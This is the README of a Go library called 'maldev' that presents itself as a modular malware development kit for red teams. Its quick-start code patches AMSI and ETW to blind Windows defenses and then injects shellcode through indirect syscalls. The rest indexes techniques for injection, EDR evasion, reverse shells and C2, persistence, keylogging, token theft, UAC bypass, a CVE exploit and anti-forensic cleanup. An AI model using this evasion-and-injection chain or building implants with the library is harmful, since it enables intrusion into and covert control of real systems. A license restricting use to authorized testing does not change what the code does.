# maldev

Modular malware development library in Go for offensive security research.

[![Go Reference](https://pkg.go.dev/badge/github.com/oioio-space/maldev.svg)](https://pkg.go.dev/github.com/oioio-space/maldev)

## Install

```bash
go get github.com/oioio-space/maldev@latest
```

## Quick Start

```go
import (
    "github.com/oioio-space/maldev/evasion"
    "github.com/oioio-space/maldev/evasion/amsi"
    "github.com/oioio-space/maldev/evasion/etw"
    "github.com/oioio-space/maldev/inject"
    wsyscall "github.com/oioio-space/maldev/win/syscall"
)

// 1. Create a Caller for stealthy syscalls
caller := wsyscall.New(wsyscall.MethodIndirect,
    wsyscall.Chain(wsyscall.NewHashGate(), wsyscall.NewHellsGate()))

// 2. Disable defenses
evasion.ApplyAll([]evasion.Technique{
    amsi.ScanBufferPatch(),
    etw.All(),
}, caller)

// 3. Inject shellcode
injector, _ := inject.NewWindowsInjector(&inject.WindowsConfig{
    Config:        inject.Config{Method: inject.MethodCreateThread},
    SyscallMethod: wsyscall.MethodIndirect,
})
injector.Inject(shellcode)
```

## Documentation

### 📖 Guides

| Guide | Description |
|-------|-------------|
| **[Getting Started](docs/getting-started.md)** | First steps — concepts, terminology, your first implant |
| **[Architecture](docs/architecture.md)** | Layered design, dependency flow, Mermaid diagrams |
| **[OPSEC Build Pipeline](docs/opsec-build.md)** | garble, pe/strip, CallByHash — building for operations |
| **[MITRE ATT&CK + D3FEND](docs/mitre.md)** | Full technique mapping with defensive countermeasures |

### 🔧 Technique Reference

Each technique has a dedicated page with beginner explanation, technical details, diagrams, usage examples, and comparison with other tools.

| Category | Techniques |
|----------|-----------|
| **[Injection](docs/techniques/injection/README.md)** | [CreateRemoteThread](docs/techniques/injection/create-remote-thread.md) · [Early Bird APC](docs/techniques/injection/early-bird-apc.md) · [Thread Hijack](docs/techniques/injection/thread-hijack.md) · [Module Stomping](docs/techniques/injection/module-stomping.md) · [Section Mapping](docs/techniques/injection/section-mapping.md) · [Callback Execution](docs/techniques/injection/callback-execution.md) · [Thread Pool](docs/techniques/injection/thread-pool.md) · [KernelCallbackTable](docs/techniques/injection/kernel-callback-table.md) · [Phantom DLL](docs/techniques/injection/phantom-dll.md) · [Arg Spoofing](docs/techniques/injection/process-arg-spoofing.md) |
| **[Evasion](docs/techniques/evasion/README.md)** | [AMSI Bypass](docs/techniques/evasion/amsi-bypass.md) · [ETW Patching](docs/techniques/evasion/etw-patching.md) · [ntdll Unhooking](docs/techniques/evasion/ntdll-unhooking.md) · [Sleep Mask](docs/techniques/evasion/sleep-mask.md) · [HW Breakpoints](docs/techniques/evasion/hw-breakpoints.md) · [ACG + BlockDLLs](docs/techniques/evasion/acg-blockdlls.md) · [Anti-Analysis](docs/techniques/evasion/anti-analysis.md) |
| **[Syscalls](docs/techniques/syscalls/README.md)** | [Direct & Indirect](docs/techniques/syscalls/direct-indirect.md) · [API Hashing](docs/techniques/syscalls/api-hashing.md) · [SSN Resolvers](docs/techniques/syscalls/ssn-resolvers.md) |
| **[C2 & Transport](docs/techniques/c2/README.md)** | [Reverse Shell](docs/techniques/c2/reverse-shell.md) · [Meterpreter](docs/techniques/c2/meterpreter.md) · [Transport](docs/techniques/c2/transport.md) · [Malleable HTTP](docs/techniques/c2/malleable-profiles.md) |
| **[PE Operations](docs/techniques/pe/README.md)** | [Strip & Sanitize](docs/techniques/pe/strip-sanitize.md) · [BOF Loader](docs/techniques/pe/bof-loader.md) · [Morph](docs/techniques/pe/morph.md) · [Certificate Theft](docs/techniques/pe/certificate-theft.md) |
| **[Persistence](docs/techniques/persistence/README.md)** | [Registry Run/RunOnce](docs/techniques/persistence/registry.md) · [StartUp Folder LNK](docs/techniques/persistence/startup-folder.md) · [Task Scheduler](docs/techniques/persistence/task-scheduler.md) |
| **[Collection](docs/techniques/collection/README.md)** | [Keylogging](docs/techniques/collection/keylogging.md) · [Clipboard Capture](docs/techniques/collection/clipboard.md) · [Screen Capture](docs/techniques/collection/screenshot.md) |
| **[Cleanup](docs/techniques/cleanup/README.md)** | [Self-Delete](docs/techniques/cleanup/self-delete.md) · [Timestomp](docs/techniques/cleanup/timestomp.md) · [Memory Wipe](docs/techniques/cleanup/memory-wipe.md) |
| **[Tokens & Privileges](docs/techniques/tokens/README.md)** | [Token Theft](docs/techniques/tokens/token-theft.md) · [Impersonation](docs/techniques/tokens/impersonation.md) · [Privilege Escalation](docs/techniques/tokens/privilege-escalation.md) |
| **[Crypto & Encoding](docs/techniques/crypto/README.md)** | [Payload Encryption](docs/techniques/crypto/payload-encryption.md) · [Fuzzy Hashing](docs/techniques/crypto/fuzzy-hashing.md) |

### 🧪 Composed Examples

| Example | What it demonstrates |
|---------|---------------------|
| **[Basic Implant](docs/examples/basic-implant.md)** | Evasion → decrypt → inject → sleep mask |
| **[Evasive Injection](docs/examples/evasive-injection.md)** | HW breakpoints → section mapping vs module stomping vs callback |
| **[Full Attack Chain](docs/examples/full-chain.md)** | Recon → evasion → inject → C2 → post-ex → cleanup |

### 📚 API Reference

Detailed API documentation for each package (function signatures, parameters, return values):

| Domain | Docs |
|--------|------|
| Evasion APIs | [docs/evasion.md](docs/evasion.md) |
| Injection APIs | [docs/injection.md](docs/injection.md) |
| Syscall APIs | [docs/syscalls.md](docs/syscalls.md) |
| C2 APIs | [docs/c2.md](docs/c2.md) |
| Windows Primitives | [docs/win.md](docs/win.md) |
| PE Operations | [docs/pe.md](docs/pe.md) |
| Persistence APIs | [docs/persistence.md](docs/persistence.md) |
| Collection APIs | [docs/collection.md](docs/collection.md) |
| Crypto & Encoding | [docs/crypto.md](docs/crypto.md) |
| Cleanup APIs | [docs/cleanup.md](docs/cleanup.md) |
| System Info | [docs/system.md](docs/system.md) |
| Privilege & Exploits | [docs/privilege.md](docs/privilege.md) |
| Process Management | [docs/process.md](docs/process.md) |

## Build

```bash
make build          # standard development build
make release        # OPSEC build (garble + strip + trimpath)
make debug          # debug build (with logging)
make test           # run all tests
make verify         # build + test + cross-compile
```

**Requirements:** Go 1.21+ · Windows SDK headers NOT required · CGO optional

## Project Structure

```
maldev/
├── crypto/          encode/          hash/          random/         useragent/
├── win/api/         win/syscall/     win/ntapi/     win/token/      win/privilege/
├── win/version/     win/domain/      win/impersonate/ win/user/
├── evasion/amsi/    evasion/etw/     evasion/unhook/ evasion/sleepmask/ evasion/hwbp/
├── evasion/acg/     evasion/blockdlls/ evasion/antidebug/ evasion/antivm/
├── evasion/herpaderping/ evasion/phant0m/ evasion/sandbox/ evasion/timing/
├── inject/          process/enum/    process/session/
├── pe/parse/        pe/strip/        pe/bof/        pe/morph/       pe/cert/
├── c2/shell/        c2/transport/    c2/meterpreter/ c2/cert/
├── persistence/registry/ persistence/startup/ persistence/scheduler/ persistence/service/
├── collection/keylog/ collection/clipboard/ collection/screenshot/
├── cleanup/memory/  cleanup/selfdelete/ cleanup/service/ cleanup/timestomp/ cleanup/wipe/
├── system/drive/    system/folder/   system/network/ system/lnk/     system/bsod/
├── uacbypass/       exploit/cve202430088/
├── internal/log/    internal/compat/  testutil/       cmd/rshell/
└── docs/            .claude/skills/   Makefile
```

## Acknowledgments

Inspired by and compared against [D3Ext/maldev](https://github.com/D3Ext/maldev) by [@D3Ext](https://github.com/D3Ext). Several improvements were informed by their implementation patterns.

## License

For authorized security research, red team operations, and penetration testing only.
